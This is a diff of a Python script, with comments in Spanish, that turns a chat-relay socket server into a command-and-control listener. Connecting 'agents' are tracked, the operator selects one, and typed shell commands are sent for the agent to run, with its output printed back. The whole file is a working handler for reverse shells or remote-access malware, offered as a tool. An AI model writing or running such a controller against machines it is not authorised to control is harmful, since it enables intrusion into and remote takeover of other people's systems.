@@ -1,51 +1,109 @@
 import socket
 import threading
 
-connections = []
-total_connections = 0
+agents = []
+total_agents = 0
 
-class Client(threading.Thread):
-    def __init__(self, socket, address, id, name, signal):
+class Agent(threading.Thread):
+    def __init__(self, socket, address, id):
         threading.Thread.__init__(self)
         self.socket = socket
         self.address = address
         self.id = id
-        self.name = name
-        self.signal = signal
+        self.signal = True
+        self.daemon = True  # muere si el main thread muere
 
     def run(self):
         while self.signal:
             try:
-                data = self.socket.recv(32)
+                data = self.socket.recv(4096)  # 4096 en vez de 32
+                if data:
+                    output = data.decode("utf-8", errors="replace")
+                    print(f"\n[Agent {self.id}] {output}")
+                    print(">> ", end="", flush=True)
             except:
-                print("Client " + str(self.address) + " has disconnected")
+                print(f"\n[!] Agent {self.id} ({self.address[0]}) desconectado")
                 self.signal = False
-                connections.remove(self)
+                if self in agents:
+                    agents.remove(self)
                 break
-            if data != "":
-                print("ID " + str(self.id) + ": " + str(data.decode("utf-8")))
-                for client in connections:
-                    if client.id != self.id:
-                        client.socket.sendall(data)
 
-def newConnections(socket):
+    def send(self, cmd):
+        self.socket.sendall(cmd.encode())
+
+
+def accept_connections(server_socket):
+    global total_agents
     while True:
-        sock, address = socket.accept()
-        global total_connections
-        connections.append(Client(sock, address, total_connections, "Name", True))
-        connections[-1].start()
-        print("New connection at ID " + str(connections[-1].id) + " " + str(address))
-        total_connections += 1
+        conn, addr = server_socket.accept()
+        agent = Agent(conn, addr, total_agents)
+        agents.append(agent)
+        agent.start()
+        print(f"\n[+] Nuevo agente: ID {total_agents} desde {addr[0]}:{addr[1]}")
+        print(">> ", end="", flush=True)
+        total_agents += 1
+
+
+def list_agents():
+    if not agents:
+        print("[*] Sin agentes conectados")
+        return
+    print("\n[*] Agentes activos:")
+    for a in agents:
+        status = "OK" if a.signal else "MUERTO"
+        print(f"  [{a.id}] {a.address[0]}:{a.address[1]} — {status}")
+
 
 def main():
     host = input("Host: ")
     port = int(input("Port: "))
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # evita "address already in use"
     sock.bind((host, port))
     sock.listen(5)
-    
-    # Inicia el hilo para aceptar nuevas conexiones
-    threading.Thread(target=newConnections, args=(sock,)).start()
+    print(f"[*] Escuchando en {host}:{port}")
+
+    threading.Thread(target=accept_connections, args=(sock,), daemon=True).start()
+
+    current_agent = None
+
+    while True:
+        cmd = input(">> ").strip()
+
+        if cmd == "":
+            continue
+        elif cmd == "help":
+            print("  list       → lista agentes")
+            print("  use <id>   → seleccionar agente")
+            print("  exit       → salir")
+            print("  <cmd>      → ejecutar en el agente seleccionado")
+        elif cmd == "list":
+            list_agents()
+        elif cmd.startswith("use "):
+            try:
+                agent_id = int(cmd.split()[1])
+                found = next((a for a in agents if a.id == agent_id), None)
+                if found:
+                    current_agent = found
+                    print(f"[*] Agente {agent_id} seleccionado")
+                else:
+                    print(f"[!] ID {agent_id} no encontrado")
+            except:
+                print("[!] Uso: use <id>")
+        elif cmd == "exit":
+            if current_agent:
+                current_agent.send("exit")
+            break
+        else:
+            if current_agent is None:
+                print("[!] Ningún agente seleccionado. Usá 'list' y después 'use <id>'")
+            elif not current_agent.signal:
+                print(f"[!] Agente {current_agent.id} desconectado")
+                current_agent = None
+            else:
+                current_agent.send(cmd)
+
 
 if __name__ == "__main__":
     main()
